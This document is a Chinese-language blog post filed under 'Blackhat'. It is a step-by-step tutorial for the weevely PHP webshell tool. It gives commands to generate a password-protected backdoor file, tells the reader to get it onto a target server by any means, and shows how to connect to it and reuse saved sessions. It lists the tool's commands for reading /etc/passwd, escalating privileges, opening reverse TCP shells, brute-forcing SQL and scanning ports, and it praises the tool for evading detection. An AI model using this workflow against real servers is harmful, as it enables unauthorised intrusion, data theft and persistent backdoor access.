---
title: 生成、管理、连接php后门webshell工具weevely的使用
name: weevely-php-webshell
date: 2016-4-13
tags: [php后门,webshell,weevely]
categories: [Blackhat]
---

* 目录
{:toc}

---


# 生成、管理、连接php后门webshell工具weevely的使用

## 1. 介绍

**[weevely](https://github.com/epinna/weevely3)**是一种命令行的webshell，它能生成php后门文件以及连接的功能。提供类似与ssh命令行终端的操作方式，weevely每次生成的webshell都不一样，所以可以有效的避免安全系统的查杀。

## 2. 特性

* SSH终端的操作
* 在目标主机上运行sql控制台
* 在目标主机上使用代理服务
* 主机配置安全审计
* 挂在目标系统文件到本地
* 在目标主机上进行扫描
* 文件上传和下载
* 正向反向TCPshell
* 暴力破解
* 管理压缩归档

## 3. 依赖安装

由于weevely是python程序编写，所以需要安装python2.7的环境以及下载weevely的主程序包，另外还需要安装weevely的python依赖库，如下：

**linux依赖库安装**

```shell
sudo apt-get install g++ python-pip libyaml-dev python-dev
sudo pip install prettytable Mako PyYAML python-dateutil PySocks –upgrade
```

**osx依赖库安装**

```shell
sudo port install python27 py27-pip
sudo port select –set pip pip27
sudo port select –set python python27
sudo pip install prettytable Mako PyYAML python-dateutil readline PySocks –upgrade
```

**windows依赖库安装**

```shell
pip install prettytable Mako PyYAML python-dateutil pyreadline PySocks –upgrade
```

## 4. 使用

### 4.1 生成php后门文件

```shell
# weevely generate <连接密码> <后门保存路径>
weevely generate 123321 /root/b.php
```

### 4.2 上传后门文件

无论你用什么方式，只要把后门文件放到对方服务器中，且通过浏览器能访问到，可能是白板，但不会有404错误。

### 4.3 shell连接后门文件

```shell
# weevely <服务器后面HTTP路径> <连接密码>
weevely http://vinny.cc/b.php 123321
```

![weevely](http://ohdpyqlwy.bkt.clouddn.com/weevely-1.png)

> **weevely**可以保存连接的**session**，此**session**并非是http里会话的概念，weevely的session保存的是站点的连接信息，通常情况下会保存在"~/.weevely/sessions/站点域名/后面文件名_x.session"中，如："/root/.weevely/sessions/www.wangjunneil.com/b_0.session"。那么在下次连接到后面时可以通过此session文件进行连接，如下：

```shell
# weevely session <session文件路径> <shell命令>
weevely session /root/.weevely/sessions/www.wangjunneil.com/b_0.session
weevely session /root/.weevely/sessions/www.wangjunneil.com/b_0.session ls -al
```

## 5. weevely内部命令

```
weevely> help
 
 :audit_filesystem     审计系统文件错误的权限
 :audit_etcpasswd      查看linux系统下/etc/passwd的口令文件
 :audit_phpconf        查看当前系统php的配置信息
 :audit_suidsgid       通过SUID或SGID查找文件
 :shell_su             使用su命令提权
 :shell_sh             运行一个shell命令
 :shell_php            运行一个php命令
 :system_extensions    查看php和server服务器的扩展
 :system_info          全局查看系统信息
 :backdoor_tcp         Spawn a shell on a TCP port.
 :backdoor_reversetcp  运行一个反向TCP shell
 :bruteforce_sql       暴力破解SQL数据库
 :file_grep            查找匹配的文件
 :file_zip             压缩或解压缩zip文件
 :file_upload2web      Upload file automatically to a web folder and get corresponding URL.
 :file_enum            Check existence and permissions of a list of paths.
 :file_read            从远程系统读取文件
 :file_cd              切换目录
 :file_ls              列出目录内容
 :file_rm              删除文件
 :file_check           获取文件信息
 :file_gzip            压缩或解压缩gzip文件
 :file_cp              复制单个文件
 :file_tar             压缩或解压缩tar文件
 :file_bzip2           压缩或解压缩bzip2文件
 :file_upload          上传文件
 :file_webdownload     Download URL to the filesystem
 :file_touch           改变文件时间戳
 :file_edit            编辑文件
 :file_find            用给出的名称和属性查找文件
 :file_download        下载文件
 :file_mount           使用HTTPfs挂在远程文件系统到本地
 :sql_dump             Multi dbms mysqldump replacement.
 :sql_console          打开SQL控制台
 :net_curl             Perform a curl-like HTTP request.
 :net_scan             TCP端口扫描
 :net_ifconfig         获取网卡信息
 :net_proxy            开启本地代理
 :net_phpproxy         在系统中安装php代理
```